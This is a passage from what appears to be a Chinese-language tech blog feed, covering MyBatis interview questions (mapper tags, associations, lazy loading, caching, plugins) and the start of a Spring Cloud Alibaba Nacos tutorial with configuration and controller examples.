<h1 id="18-Xml-映射文件中，除了常见的-select、insert、updae、delete-标签之外，还有哪些标签？"><a href="#18-Xml-映射文件中，除了常见的-select、insert、updae、delete-标签之外，还有哪些标签？" class="headerlink" title="18. Xml 映射文件中，除了常见的 select、insert、updae、delete 标签之外，还有哪些标签？"></a>18. Xml 映射文件中，除了常见的 select、insert、updae、delete 标签之外，还有哪些标签？</h1><p><code>&lt;resultMap&gt;</code>、<code>&lt;parameterMap&gt;</code>、<code>&lt;sql&gt;</code>、<code>&lt;include&gt;</code>、<code>&lt;selectKey&gt;</code>，加上动态 sql 的 9 个标签，其中 <code>&lt;sql&gt;</code> 为 sql 片段标签，通过 <code>&lt;include&gt;</code> 标签引入 sql 片段,<code>&lt;selectKey&gt;</code> 为不支持自增的主键生成策略标签。</p>
<h1 id="19-Mybatis-的-Xml-映射文件中，不同的-Xml-映射文件，id-是否可以重复？"><a href="#19-Mybatis-的-Xml-映射文件中，不同的-Xml-映射文件，id-是否可以重复？" class="headerlink" title="19. Mybatis 的 Xml 映射文件中，不同的 Xml 映射文件，id 是否可以重复？"></a>19. Mybatis 的 Xml 映射文件中，不同的 Xml 映射文件，id 是否可以重复？</h1><p>不同的 Xml 映射文件，如果配置了 namespace，那么 id 可以重复；如果没有配置 namespace，那么 id 不能重复；</p>
<p>原因就是 <code>namespace+id</code> 是作为 <code>Map&lt;String, MapperStatement&gt;</code>的 key 使用的，如果没有 namespace，就剩下 id，那么，id 重复会导致数据互相覆盖。有了 namespace，自然 id 就可以重复，namespace 不同，<code>namespace+id</code> 自然也就不同</p>
<h1 id="20-为什么说-Mybatis-是半自动-ORM-映射工具？它与全自动的区别在哪里"><a href="#20-为什么说-Mybatis-是半自动-ORM-映射工具？它与全自动的区别在哪里" class="headerlink" title="20. 为什么说 Mybatis 是半自动 ORM 映射工具？它与全自动的区别在哪里?"></a>20. 为什么说 Mybatis 是半自动 ORM 映射工具？它与全自动的区别在哪里?</h1><p>Hibernate 属于全自动 ORM 映射工具，使用 Hibernate 查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。而 Mybatis 在查询关联对象或关联集合对象时，需要手动编写 sql 来完成，所以，称之为半自动 ORM 映射工具</p>
<h1 id="21-一对一、一对多的关联查询"><a href="#21-一对一、一对多的关联查询" class="headerlink" title="21. 一对一、一对多的关联查询"></a>21. 一对一、一对多的关联查询</h1><p>一对一 xml 配置方案：</p>
<p>在需要进行关联查询的 mapper 中配置 <code>association</code> 节点，其有以下几个属性：</p>
<ul>
<li><code>property</code>：对应该实体类关联另一个实体类的变量名</li>
<li><code>column</code>：对应表的字段名</li>
<li><code>javaType</code>：对应关联的实体类</li>
<li><code>select</code>：指定子查询（注意要加入名称空间）</li>
</ul>
<p>一对多 xml配置方案：</p>
<p>在 mapper 文件中使用 <code>collection</code> 节点，其有以下几个属性：</p>
<ul>
<li><code>property</code>：对应表中的 commentsList</li>
<li><code>column</code>：当前表与外表关联的键（一般是id）</li>
<li><code>javaType</code>：对应 property 的类型</li>
<li><code>ofType</code>：对应外表的实体类</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.lcb.mapping.userMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--association 一对一关联查询 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getClass&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;ClassesResultMap&quot;</span>&gt;</span></span><br><span class="line">        select * from class c,teacher t where c.teacher_id=t.t_id and c.c_id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.lcb.user.Classes&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ClassesResultMap&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 实体类的字段名和数据表的字段名映射 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;com.lcb.user.Teacher&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--collection 一对多关联查询 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getClass2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;ClassesResultMap2&quot;</span>&gt;</span></span><br><span class="line">        select * from class c,teacher t,student s where c.teacher_id=t.t_id </span><br><span class="line">        and c.c_id=s.class_id and c.c_id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.lcb.user.Classes&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ClassesResultMap2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;com.lcb.user.Teacher&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;student&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;com.lcb.user.Student&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;s_id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;s_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="22-MyBatis-实现一对一有几种方式-具体怎么操作的？"><a href="#22-MyBatis-实现一对一有几种方式-具体怎么操作的？" class="headerlink" title="22. MyBatis 实现一对一有几种方式?具体怎么操作的？"></a>22. MyBatis 实现一对一有几种方式?具体怎么操作的？</h1><p>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次, 通过在 <code>resultMap</code> 里面配置 <code>association</code> 节点配置一对一的类就可以完成；</p>
<p>嵌套查询是先查一个表，根据这个表里面的结果的外键 id，再去另外一个表里面查询数据,也是通过 <code>association</code> 配置，但另外一个表的查询通过 <code>select</code> 属性配置。</p>
<p>同理，对于一对多也有两种，对应将 <code>association</code> 节点改成 <code>collection</code> 即可。</p>
<h1 id="23-Mybatis-是否支持延迟加载？如果支持，它的实现原理是什么？"><a href="#23-Mybatis-是否支持延迟加载？如果支持，它的实现原理是什么？" class="headerlink" title="23. Mybatis 是否支持延迟加载？如果支持，它的实现原理是什么？"></a>23. Mybatis 是否支持延迟加载？如果支持，它的实现原理是什么？</h1><p>Mybatis 仅支持 <code>association</code> 关联对象和 <code>collection</code> 关联集合对象的延迟加载,<code>association</code> 指的就是一对一，<code>collection</code> 指的就是一对多查询。在 Mybatis 配置文件中，可以配置是否启用延迟加载 <code>lazyLoadingEnabled=true|false</code>。</p>
<p>它的原理是，使用 CGLIB 创建目标对象的代理对象，当调用目标方法时，进入拦截器方法，比如调用 <code>a.getB().getName()</code>，拦截器 <code>invoke()</code> 方法发现 <code>a.getB()</code> 是 null 值，那么就会单独发送事先保存好的查询关联 B 对象的 sql，把 B 查询上来，然后调用 <code>a.setB(b)</code>，于是 a 的对象 b 属性就有值了，接着完成 <code>a.getB().getName()</code> 方法的调用。这就是延迟加载的基本原理。</p>
<p>延迟加载分为积极延迟加载和非积极延迟加载，当开启延迟加载后，默认是积极延迟加载。</p>
<ul>
<li><p>积极延迟加载：只要获取任意属性内容，无论属性是否是关联表的内容，都会执行关联的表查询</p>
</li>
<li><p>非积极延迟加载：使用非延迟加载，只有当访问关联表数据时，才会执行关联表的查询。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;settings &gt;</span><br><span class="line">    &lt;setting name&#x3D;&quot;aggressiveLazyLoading&quot; value&#x3D;&quot;false&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;settings&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="24-Mybatis-的一级、二级缓存"><a href="#24-Mybatis-的一级、二级缓存" class="headerlink" title="24. Mybatis 的一级、二级缓存"></a>24. Mybatis 的一级、二级缓存</h1><p>一级缓存: 基于 <code>PerpetualCache</code>(永久缓存) 的 <code>HashMap</code> 本地缓存，其存储作用域为 Session，当 Session flush 或 close 之后，该 Session 中的所有 Cache 就将清空。另外，如果在两次查询中间有增删改的操作，那么 MyBatis 就会重新刷新清空缓存区，那么下一次查询会重新执行 sql 语句默认打开一级缓存。</p>
<p>二级缓存与一级缓存其机制相同，默认也是采用 <code>PerpetualCache</code>，HashMap 存储，不同在于其存储作用域为 <code>Mapper(Namespace)</code>，并且可自定义存储源，如 <code>Ehcache</code>。默认不打开二级缓存，要开启二级缓存，使用二级缓存属性类需要实现 <code>Serializable</code> 序列化接口(可用来保存对象的状态),在它的映射文件中配置 <code>&lt;cache/&gt;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">public class Blogs implements Serializable &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">cache</span>  /&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于缓存数据更新机制，当某一个作用域(一级缓存 Session/二级缓存 Namespaces)的进行了 C/U/D 操作后，默认该作用域下所有 select 中的缓存将被 clear。</p>
<h1 id="25-什么是-MyBatis-的接口绑定？有哪些实现方式"><a href="#25-什么是-MyBatis-的接口绑定？有哪些实现方式" class="headerlink" title="25. 什么是 MyBatis 的接口绑定？有哪些实现方式?"></a>25. 什么是 MyBatis 的接口绑定？有哪些实现方式?</h1><p>接口绑定，就是在 MyBatis 中任意定义接口,然后把接口里面的方法和 SQL 语句绑定, 我们直接调用接口方法就可以,这样比起原来了 SqlSession 提供的方法我们可以有更加灵活的选择和设置。</p>
<p>接口绑定有两种实现方式,一种是通过注解绑定，就是在接口的方法上面加上 <code>@Select</code>、<code>@Update</code> 等注解，里面包含 Sql 语句来绑定；另外一种就是通过 xml 里面写 SQL 来绑定, 在这种情况下,要指定 xml 映射文件里面的 <code>namespace</code> 必须为接口的全路径名。当 Sql 语句比较简单时候,用注解绑定, 当 SQL 语句比较复杂时候,用 xml 绑定,一般用 xml 绑定的比较多。</p>
<h1 id="26-使用-MyBatis-的-mapper-接口调用时有哪些要求？"><a href="#26-使用-MyBatis-的-mapper-接口调用时有哪些要求？" class="headerlink" title="26. 使用 MyBatis 的 mapper 接口调用时有哪些要求？"></a>26. 使用 MyBatis 的 mapper 接口调用时有哪些要求？</h1><ol>
<li>Mapper 接口方法名和 mapper.xml 中定义的每个 sql 的 id 相同；</li>
<li>Mapper 接口方法的输入参数类型和 mapper.xml 中定义的每个 sql 的 <code>parameterType</code> 的类型相同；</li>
<li>Mapper 接口方法的输出参数类型和 mapper.xml 中定义的每个 sql 的 <code>resultType</code> 的类型相同；</li>
<li>Mapper.xml 文件中的 <code>namespace</code> 即是 <code>mapper</code> 接口的类路径。</li>
</ol>
<h1 id="27-Mapper-编写有哪几种方式？"><a href="#27-Mapper-编写有哪几种方式？" class="headerlink" title="27. Mapper 编写有哪几种方式？"></a>27. Mapper 编写有哪几种方式？</h1><h2 id="第一种：使用传统Dao层开发"><a href="#第一种：使用传统Dao层开发" class="headerlink" title="第一种：使用传统Dao层开发"></a>第一种：使用传统Dao层开发</h2><p>接口实现类继承 SqlSessionDaoSupport：使用此种方法需要编写 mapper 接口，mapper 接口实现类、mapper.xml 文件。</p>
<ol>
<li><p>在 sqlMapConfig.xml 中配置 mapper.xml 的位置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper.xml 文件的地址&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper.xml 文件的地址&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>定义 mapper 接口</p>
</li>
<li><p>实现类继承 <code>SqlSessionDaoSupport</code>,mapper 方法中可以通过 <code>this.getSqlSession()</code>进行数据增删改查。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoImpl</span> <span class="keyword">extends</span> <span class="title">SqlSessionDaoSupport</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> User <span class="title">selectUserById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">           User user = <span class="keyword">this</span>.getSqlSession().selectOne(<span class="string">&quot;com.xm.dao.UserDao.selectUserById&quot;</span>, id);<span class="comment">//指定到后面需要写的mapper映射文件的命名空间下</span></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>spring 配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactoryBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 注入mybatis配置文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:spring-mybatis.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="第二种：Mapper动态代理开发（不用自己写Dao实现类）"><a href="#第二种：Mapper动态代理开发（不用自己写Dao实现类）" class="headerlink" title="第二种：Mapper动态代理开发（不用自己写Dao实现类）"></a>第二种：Mapper动态代理开发（不用自己写Dao实现类）</h2><ol>
<li><p>使用 <code>org.mybatis.spring.mapper.MapperFactoryBean</code> ：在 <code>sqlMapConfig.xml</code> 中配置 <code>mapper.xml</code> 的位置，如果 <code>mapper.xml</code> 和 <code>mapper</code> 接口的名称相同且在同一个目录，这里可以不用配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper.xml 文件的地址&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper.xml 文件的地址&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>定义 mapper 接口：</p>
</li>
</ol>
<ul>
<li><p>mapper.xml 中的 namespace 为 mapper 接口的地址</p>
</li>
<li><p>mapper 接口中的方法名和 mapper.xml 中的定义的 statement 的 id 保持一致</p>
</li>
<li><p>Spring 中定义xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;org.mybatis.spring.mapper.MapperFactoryBean&quot;&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;sqlSessionFactory&quot; ref&#x3D;&quot;sqlSessionFactoryBean&quot;&#x2F;&gt;</span><br><span class="line">	&lt;!-- 此处关联到dao层接口 --&gt;</span><br><span class="line">    &lt;property name&#x3D;&quot;mapperInterface&quot; value&#x3D;&quot;com.xm.dao.UserDao&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="第三种：使用-mapper-扫描器"><a href="#第三种：使用-mapper-扫描器" class="headerlink" title="第三种：使用 mapper 扫描器"></a>第三种：使用 mapper 扫描器</h2><ol>
<li>mapper.xml 文件编写：</li>
</ol>
<ul>
<li>mapper.xml 中的 <code>namespace</code> 为 <code>mapper</code> 接口的地址；</li>
<li>mapper 接口中的方法名和 <code>mapper.xml</code> 中的定义的 <code>statement</code> 的 <code>id</code> 保持一致；</li>
<li>如果将 mapper.xml 和 mapper接口的名称保持一致则不用在 <code>sqlMapConfig.xml</code> 中进行配置。</li>
</ul>
<ol>
<li><p>定义 mapper 接口：注意 <code>mapper.xml</code> 的文件名和 <code>mapper</code> 的接口名称保持一致，且放在同一个目录</p>
</li>
<li><p>配置 mapper 扫描器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基本包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.xm.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用扫描器后从 spring 容器中获取 mapper 的实现对象。</p>
</li>
</ol>
<h1 id="28-简述-Mybatis-的插件运行原理，以及如何编写一个插件。"><a href="#28-简述-Mybatis-的插件运行原理，以及如何编写一个插件。" class="headerlink" title="28. 简述 Mybatis 的插件运行原理，以及如何编写一个插件。"></a>28. 简述 Mybatis 的插件运行原理，以及如何编写一个插件。</h1><p>Mybatis 仅可以编写针对 <code>ParameterHandler</code>、<code>ResultSetHandler</code>、<code>StatementHandler</code>、<code>Executor</code> 这 4 种接口的插件，Mybatis 使用 JDK 的动态代理，为需要拦截的接口生成代理对象以实现接口方法拦截功能，每当执行这 4 种接口对象的方法时，就会进入拦截方法，具体就是 <code>InvocationHandler</code> 的 <code>invoke()</code>方法，当然，只会拦截那些你指定需要拦截的方法。</p>
<p>编写插件：实现 Mybatis 的 <code>Interceptor</code> 接口并复写 <code>ntercept()</code> 方法，然后在给插件编写注解，指定要拦截哪一个接口的哪些方法即可，记住，别忘了在配置文件中配置你编写的插件。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>springCloud Alibaba</title>
    <url>/2021/02/04/SpringCloud%20Alibaba/</url>
    <content><![CDATA[<h1 id="SpringCloud-Alibaba"><a href="#SpringCloud-Alibaba" class="headerlink" title="SpringCloud Alibaba"></a>SpringCloud Alibaba</h1><p><img src="https://csn.damyoung.cn/image-20210201172218049.png" alt="image-20210201172218049"></p>
<p>git地址<a href="http://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md">http://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md</a></p>
<a id="more"></a>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring cloud alibaba 2.1.0.RELEASE--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="服务注册和配置中心Nacos"><a href="#服务注册和配置中心Nacos" class="headerlink" title="服务注册和配置中心Nacos"></a>服务注册和配置中心Nacos</h1><h2 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h2><p>Naming Configuration service 一个易于使用的动态服务发现，配置和服务管理平台，用于构建云本机应用程序。替代Eureka做服务注册中心，替代Config做服务配置中心</p>
<p>官网<a href="https://github.com/alibaba/Nacos">https://github.com/alibaba/Nacos</a></p>
<p><img src="https://csn.damyoung.cn/image-20210201174946053.png" alt="image-20210201174946053"></p>
<h3 id="服务提供者"><a href="#服务提供者" class="headerlink" title="服务提供者"></a>服务提供者</h3><p>cloudalibaba-provider-payment9001</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-payment-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#配置Nacos地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201202924740.png" alt="image-20210201202924740"></p>
<p><img src="https://csn.damyoung.cn/image-20210201211349320.png" alt="image-20210201211349320"></p>
<h4 id="拷贝虚拟端口映射"><a href="#拷贝虚拟端口映射" class="headerlink" title="拷贝虚拟端口映射"></a>拷贝虚拟端口映射</h4><p><img src="https://csn.damyoung.cn/image-20210201211708949.png" alt="image-20210201211708949"></p>
<h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><p><img src="https://csn.damyoung.cn/image-20210201211822353.png" alt="image-20210201211822353"></p>
<h3 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h3><p>nacos整合了Ribbon，自带负载均衡</p>
<p><img src="https://csn.damyoung.cn/image-20210201212137369.png" alt="image-20210201212137369"></p>
<p>cloudalibaba-consumer-nacos-order83</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba nacos --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-order-consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#消费者将要去访问的微服务名称(注册成功进nacos的微服务提供者)</span></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span class="string">http://nacos-payment-provider</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNacosController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;service-url.nacos-user-service&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverURL;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/consumer/payment/nacos/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(serverURL+<span class="string">&quot;/payment/nacos/&quot;</span>+id,String.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

